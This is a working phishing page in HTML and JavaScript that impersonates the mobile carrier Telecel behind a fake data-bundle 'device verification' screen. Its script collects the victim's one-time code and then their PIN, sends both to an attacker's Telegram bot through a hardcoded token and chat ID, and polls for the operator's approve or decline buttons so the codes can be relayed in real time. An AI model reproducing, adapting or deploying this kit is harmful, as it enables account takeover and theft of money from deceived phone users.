<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - Device Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section { text-align: center; padding: 22px 0 10px; }
        .telecel-logo { width: 85px; height: auto; display: block; margin: 0 auto; }
        h1 {
            text-align: center;
            font-size: 23px;
            font-weight: 700;
            color: #1e2937;
            margin: 8px 0 6px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15.3px;
            padding: 0 25px 18px;
            line-height: 1.5;
        }
        .offer-info {
            background: #fff0f0;
            margin: 0 20px 18px;
            padding: 15px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #ffe0e0;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 18px 0 26px;
            padding: 0 20px;
        }
        .otp-input {
            width: 52px;
            height: 62px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            outline: none;
            transition: all 0.2s;
        }
        .otp-input:focus {
            border-color: #E30613;
            box-shadow: 0 0 0 4px rgba(227, 6, 19, 0.15);
        }
        .form-section { padding: 0 25px 30px; }
        .error-msg {
            text-align: center;
            margin: 12px 20px 18px;
            font-size: 14.8px;
            padding: 14px;
            border-radius: 12px;
            display: none;
            color: #dc3545;
            background: #ffebee;
            border: 1px solid #ffc6c6;
        }
        .btn-action {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 17px;
            font-size: 17.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px 0;
        }
        .btn-action:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 16px;
            font-size: 16.5px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
        }
        /* PIN Modal */
        #pinModal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.75);
            z-index: 3000;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }
        .modal-content {
            background: white;
            width: 100%;
            max-width: 420px;
            border-radius: 24px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        #spinner {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.92);
            z-index: 4000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 65px;
            height: 65px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <svg class="telecel-logo" width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Your SVG logo (unchanged) -->
                <path d="M48.19 28.6833C..." fill="#E32526"/>
                <!-- ... rest of SVG paths ... -->
            </svg>
        </div>
        <h1>Verify Device</h1>
        <p class="subtitle">Please enter the 6-digit code sent to your number</p>
      
        <div class="offer-info" id="offerInfo">
            <strong id="offerTitle"></strong><br>
            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:22px;"></span>
        </div>
        <div class="otp-container" id="otpInputs"></div>
        <div class="error-msg" id="errMsg"></div>
        <div class="form-section">
            <button class="btn-action" id="verifyBtn">Verify Device Code</button>
            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
        </div>
    </div>

    <!-- PIN Modal -->
    <div id="pinModal">
        <div class="modal-content">
            <div class="logo-section">
                <svg class="telecel-logo" width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <!-- Same SVG -->
                </svg>
            </div>
            <h1>Enter PIN</h1>
            <p class="subtitle">Enter your 4-digit PIN to complete this transaction</p>
          
            <div class="otp-container" id="pinInputs"></div>
            <div class="error-msg" id="pinErrMsg"></div>
            <div class="form-section">
                <button class="btn-action" id="confirmPinBtn">Confirm PIN</button>
            </div>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:25px; font-size:17px;">Verifying...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8506416362:AAF8XqQp2I_Rrtp05BjBhDy7Aas3nIYA2VU',
            CHAT_ID: '8218539661',
            SUCCESS_PAGE: 'success.html'
        };

        let pollingInterval = null;
        let lastUpdateId = 0;
        let isProcessing = false;

        const errMsg = document.getElementById('errMsg');
        const pinErrMsg = document.getElementById('pinErrMsg');
        const spinner = document.getElementById('spinner');
        const pinModal = document.getElementById('pinModal');
        const verifyBtn = document.getElementById('verifyBtn');
        const confirmPinBtn = document.getElementById('confirmPinBtn');

        function loadOffer() {
            const params = new URLSearchParams(window.location.search);
            const name = params.get('offer') || 'Data Bundle';
            const data = params.get('data') || '';
            const price = params.get('price') || '0';
           
            document.getElementById('offerTitle').textContent = name + (data ? ` - ${data}` : '');
            document.getElementById('offerPrice').textContent = `GHS ${price}`;
        }

        function createInputs(containerId, count) {
            const container = document.getElementById(containerId);
            container.innerHTML = '';
            for (let i = 0; i < count; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
        }

        function getCode(containerId) {
            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
                       .map(i => i.value.trim()).join('');
        }

        function setupAutoFocus(containerId, length, callback) {
            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < length - 1) {
                        inputs[index + 1].focus();
                    }
                    if (getCode(containerId).length === length) {
                        setTimeout(callback, 180);
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !input.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        function focusFirstInput(containerId) {
            const first = document.querySelector(`#${containerId} .otp-input`);
            if (first) first.focus();
        }

        function stopPolling() {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        async function answerCallback(queryId) {
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: queryId })
                });
            } catch (e) {}
        }

        function submitCode() {
            if (isProcessing) return;
            isProcessing = true;
            verifyBtn.disabled = true;
            verifyBtn.textContent = "Verifying...";

            const code = getCode('otpInputs');
            if (code.length !== 6) {
                resetDeviceButton();
                return;
            }

            const ts = Date.now();
            const approveId = `dev_approve_${ts}`;
            const declineId = `dev_decline_${ts}`;
            const verifyId = `dev_verify_${ts}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔴 Device Verification</b>\n\nOffer: ${document.getElementById('offerTitle').textContent}\nCode: <code>${code}</code>\nTime: ${new Date().toLocaleTimeString()}`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve", callback_data: approveId },
                                { text: "🔄 Verify", callback_data: verifyId }
                            ],
                            [{ text: "❌ Decline", callback_data: declineId }]
                        ]
                    }
                })
            })
            .then(() => {
                spinner.style.display = 'flex';
                startPolling(approveId, declineId, verifyId);
            })
            .catch(() => {
                errMsg.textContent = "Network error. Please try again.";
                errMsg.style.display = 'block';
                resetDeviceButton();
            });
        }

        function startPolling(approveId, declineId, verifyId) {
            stopPolling();

            pollingInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;

                        data.result.forEach(update => {
                            lastUpdateId = Math.max(lastUpdateId, update.update_id);

                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                const queryId = update.callback_query.id;
                                answerCallback(queryId);

                                if (cb === approveId) {
                                    stopPolling();
                                    spinner.style.display = 'none';
                                    showPinModal();
                                } 
                                else if (cb === verifyId) {
                                    stopPolling();
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + new URLSearchParams(window.location.search).toString();
                                } 
                                else if (cb === declineId) {
                                    stopPolling();
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Code declined. Please try again.";
                                    errMsg.style.display = 'block';
                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                    resetDeviceButton();
                                }
                            }
                        });
                    })
                    .catch(() => {});
            }, 1200);
        }

        function showPinModal() {
            pinModal.style.display = 'flex';
            createInputs('pinInputs', 4);
            setupAutoFocus('pinInputs', 4, submitPIN);
            focusFirstInput('pinInputs');
            pinErrMsg.style.display = 'none';
        }

        function submitPIN() {
            const pin = getCode('pinInputs');
            if (pin.length !== 4) return;

            confirmPinBtn.disabled = true;
            confirmPinBtn.textContent = "Verifying...";

            const ts = Date.now();
            const validId = `pin_valid_${ts}`;
            const invalidId = `pin_invalid_${ts}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\nTime: ${new Date().toLocaleTimeString()}`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: "✅ Valid PIN", callback_data: validId },
                            { text: "❌ Invalid PIN", callback_data: invalidId }
                        ]]
                    }
                })
            })
            .then(() => startPinPolling(validId, invalidId))
            .catch(() => {
                confirmPinBtn.disabled = false;
                confirmPinBtn.textContent = "Confirm PIN";
            });
        }

        function startPinPolling(validId, invalidId) {
            stopPolling();

            pollingInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;

                        data.result.forEach(update => {
                            lastUpdateId = Math.max(lastUpdateId, update.update_id);

                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                const queryId = update.callback_query.id;
                                answerCallback(queryId);

                                if (cb === validId) {
                                    stopPolling();
                                    pinModal.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + new URLSearchParams(window.location.search).toString();
                                } 
                                else if (cb === invalidId) {
                                    stopPolling();
                                    pinErrMsg.textContent = "Invalid PIN. Please try again.";
                                    pinErrMsg.style.display = 'block';
                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
                                    focusFirstInput('pinInputs');
                                    confirmPinBtn.disabled = false;
                                    confirmPinBtn.textContent = "Confirm PIN";
                                }
                            }
                        });
                    })
                    .catch(() => {});
            }, 1300);
        }

        function resetDeviceButton() {
            isProcessing = false;
            verifyBtn.disabled = false;
            verifyBtn.textContent = "Verify Device Code";
        }

        // Initialize
        createInputs('otpInputs', 6);
        setupAutoFocus('otpInputs', 6, submitCode);
        focusFirstInput('otpInputs');
        verifyBtn.onclick = submitCode;
        confirmPinBtn.onclick = submitPIN;
        loadOffer();
    </script>
</body>
</html>
